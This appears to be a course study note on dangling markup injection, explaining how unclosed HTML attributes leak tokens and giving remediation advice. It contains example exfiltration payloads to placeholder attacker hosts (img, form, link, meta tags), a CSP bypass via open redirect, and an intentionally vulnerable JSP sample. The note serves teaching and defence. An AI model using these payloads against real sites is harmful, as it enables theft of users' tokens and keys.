---
tags: [web-exploitation, advanced, vapt]
difficulty: advanced
module: "58 - Advanced Web Techniques"
topic: "58.03 Dangling Markup Injection"
---

# Dangling Markup Injection

## 1. Executive Summary

Dangling Markup Injection is a highly specialized, advanced client-side vulnerability primarily utilized for data exfiltration. It is executed in environments where traditional Cross-Site Scripting (XSS) attacks are neutralized—either through robust input sanitization that strips `<script>` tags or through stringent Content Security Policies (CSP) that block inline JavaScript execution.

The attack leverages the forgiving nature of browser HTML parsers. By injecting an incomplete, "dangling" HTML tag—specifically one with an unclosed attribute quote (e.g., `<img src='http://attacker.com/?leak=`)—the attacker forces the browser to consume subsequent, legitimate HTML source code as part of the injected attribute. If sensitive data (such as anti-CSRF tokens, hidden form fields, user PII, or internal API keys) happens to be located directly below the injection point in the DOM, it is absorbed into the attribute and subsequently exfiltrated to the attacker's server via an automated HTTP request.

## 2. Conceptual Foundation: The HTML Parsing Quirk

Browsers (Chrome, Firefox, Safari) are designed to render broken or malformed HTML as best as they can, prioritizing user experience over strict parsing errors. 

When a browser encounters an opening quote for an HTML attribute, it enters a state where it treats all subsequent characters as a string value for that attribute until it encounters a matching closing quote (or a newline in some specific, older contexts).

**The Vulnerability Condition:**
1. The application reflects user input into the HTML document.
2. The application filters dangerous tags (like `<script>`) but fails to encode angle brackets (`<`, `>`) and quotes (`'`, `"`).
3. Sensitive data is rendered in the HTML *after* the point of injection.

## 3. In-Depth Architectural Mechanics

Let's dissect the parsing phase. Consider an application that reflects a search query and then presents a form containing a sensitive CSRF token.

**Legitimate Source Code:**
```html
<body>
  <p>Your search: apples</p>
  <form action="/transfer" method="POST">
    <input type="hidden" name="csrf_token" value="SECRET_TOKEN_999">
    <button>Submit</button>
  </form>
</body>
```

**Attacker Input:** `<img src='http://evil.com/?data=`

**Poisoned Source Code (As seen by the browser):**
```html
<body>
  <p>Your search: <img src='http://evil.com/?data=</p>
  <form action="/transfer" method="POST">
    <input type="hidden" name="csrf_token" value="SECRET_TOKEN_999">
    <button>Submit</button>
  </form>
</body>
```

**How the Browser Parses This:**
The browser sees `<img src='`. It begins recording the URL. It consumes the `</p>`, the `<form>` tag, the `<input>` tag, and finally stops when it hits the single quote inside `value="SECRET_TOKEN_999"` (or another matching quote further down).

The resulting URL the browser attempts to fetch is:
`http://evil.com/?data=</p><form action="/transfer" method="POST"><input type="hidden" name="csrf_token" value="SECRET_TOKEN_999">`

The browser fires a `GET` request to the attacker's server. The attacker inspects their access logs, decodes the URL-encoded string, and extracts `SECRET_TOKEN_999`.

## 4. ASCII Diagram: Dangling Markup Data Exfiltration Flow

```text
   +---------------------------------------------------+
   | VULNERABLE WEB PAGE RENDERED IN VICTIM'S BROWSER  |
   |                                                   |
   |  [ Injection Point ]                              |
   |  <img src='http://attacker.com/log?leak=          |
   |  ======================================> [START]  |
   |                                            |      |
   |  <div class="user-dashboard">              |      |
   |    <h2>Welcome Back!</h2>                  |      |
   |    <!-- Sensitive Data Below -->           |      |
   |    <input type="hidden" id="api_key"       |      |
   |           value="sk_live_12345ABCD">       |      |
   |  </div>                                    |      |
   |                                            |      |
   |  <a href='/logout' class='btn'>Logout</a>  |      |
   |                          ^                 |      |
   |  [MATCHING QUOTE FOUND] <================= [STOP] |
   +---------------------------------------------------+
            |
            | Browser executes the <img> tag request
            v
   +---------------------------------------------------+
   | ATTACKER CONTROLLED SERVER (attacker.com)         |
   |                                                   |
   | Access Log:                                       |
   | GET /log?leak=%3Cdiv%20class=%22user-dashboard%...|
   | ...value=%22sk_live_12345ABCD%22%3E               |
   |                                                   |
   | Result: API Key "sk_live_12345ABCD" is stolen.    |
   +---------------------------------------------------+
```

## 5. Exploitation Scenarios and Attack Vectors

### A. Image-Based Exfiltration (The Standard Vector)
The `<img>` tag is the most reliable vector because browsers automatically initiate HTTP `GET` requests for image sources upon rendering the DOM. 
Payload: `<img src='http://attacker.com/?leak=`

### B. Form Action Hijacking (CSP Evasion)
If a strict Content Security Policy (`img-src 'self'`) blocks images from loading external domains, attackers can pivot to dangling `<form>` tags.
Payload: `<form action='http://attacker.com/leak' method='GET'><input type="hidden" name="data" value='`
This attack requires user interaction. The form absorbs the subsequent HTML into the `data` parameter. When the user clicks any button that the browser perceives as part of this dangling form, the form submits, exfiltrating the data.

### C. `<link>` and `<meta>` Tags
Browsers aggressively prefetch resources. Attackers can use dangling link tags to bypass certain WAF rules.
Payload: `<link rel="prefetch" href='http://attacker.com/?leak=`
Payload: `<meta http-equiv="refresh" content='5;url=http://attacker.com/?leak=`

### D. Window.name / Target Hijacking
By injecting `<base target='`, an attacker can force all subsequent relative links on the page to open in a new window whose name is the stolen data. The attacker's origin window can then read the `window.name` property. This is highly complex and heavily mitigated by modern browser site isolation, but historically significant.

## 6. Overcoming Modern Browser Mitigations

Modern browsers (specifically Chrome/Edge via the Chromium engine) have implemented mitigations against Dangling Markup Injection.
- **Cross-Origin Read Blocking (CORB):** Prevents certain types of data from being read.
- **Newline Truncation:** Chrome actively truncates URLs in `<img>` attributes if they contain a newline character (`\n`) or angle brackets (`<`) in specific contexts. 

**Bypassing Newline Restrictions:**
If Chrome drops requests containing newlines, the attacker must find injection points that sit on the *same line* as the sensitive data, or exploit application logic that minifies HTML (removing all newlines) before sending it to the client.

## 7. Deep Dive: Bypassing Strict CSP

Dangling Markup is the ultimate weapon against a strict CSP that prevents XSS. 
If the CSP is: `default-src 'self'; script-src 'self'; img-src 'self';`

The attacker cannot use `<img>` to send data to `evil.com`. However, they can chain Dangling Markup with an **Open Redirect** on the target application.
Payload: `<img src='/redirect?url=http://attacker.com/?leak=`
Since `/redirect` is on `'self'`, the CSP allows the initial request. The server then issues a 302 Redirect to the attacker's server, carrying the absorbed data in the URL.

## 8. Source Code Analysis: Real-World Vulnerability

### Vulnerable Code (Java/JSP)
```jsp
<%
  String searchParam = request.getParameter("query");
  // Developer implements a blacklist approach to prevent XSS
  searchParam = searchParam.replaceAll("<script>", "");
  searchParam = searchParam.replaceAll("onload", "");
  searchParam = searchParam.replaceAll("onerror", "");
%>
<div class="search-header">
  <h1>Results for: <%= searchParam %></h1>
</div>

<div class="account-settings">
  <!-- Sensitive Token -->
  <input type="hidden" id="csrf_token" value="<%= generateCSRF() %>">
  <a href="/update">Update Settings</a>
</div>
```
Because the developer used a blacklist and failed to HTML entity encode the output, the application is completely vulnerable to `<img src='http://evil.com/?`

## 9. Defensive Posture and Remediation

1. **Context-Aware Output Encoding (Primary Defense):** The absolute solution to Dangling Markup (and all HTML Injection) is strictly encoding user input before rendering it into the DOM. 
   - `<` becomes `&lt;`
   - `>` becomes `&gt;`
   - `'` becomes `&#x27;`
   - `"` becomes `&quot;`
   If the quotes are encoded, the browser will never interpret them as the beginning of an attribute.
2. **Modern Frontend Frameworks:** Utilizing frameworks like React, Angular, or Vue.js inherently protects against this, as they utilize safe DOM manipulation APIs (`textContent` or data binding) rather than raw string concatenation (`innerHTML`).
3. **Strategic DOM Layout:** Place highly sensitive tokens (like CSRF tokens) at the absolute top of the HTML document, within the `<head>` or immediately inside the `<body>`. Dangling markup only consumes data *below* the point of injection. It cannot read backwards up the DOM.
4. **Implement Strict CSP:** Restricting `img-src`, `connect-src`, and `form-action` to `'self'` significantly raises the barrier to exfiltration.

## 10. Chaining Opportunities

- **Dangling Markup + Cross-Site Request Forgery (CSRF):** Exfiltrating an anti-CSRF token to immediately execute a forged state-changing request (e.g., password change, funds transfer).
- **Dangling Markup + Open Redirect:** Utilizing an internal open redirect to bypass `img-src` CSP directives and facilitate the data exfiltration.
- **Dangling Markup + Broken Object Level Authorization (BOLA):** Stealing hidden internal GUIDs or numeric IDs embedded in the DOM to leverage in backend authorization attacks.

## 11. Related Notes

- [[07 - Cross-Site Scripting (XSS)]]
- [[12 - Content Security Policy (CSP) Bypasses]]
- [[08 - Cross-Site Request Forgery (CSRF)]]
- [[04 - CSS Injection]]
- [[15 - Client-Side Security Controls]]
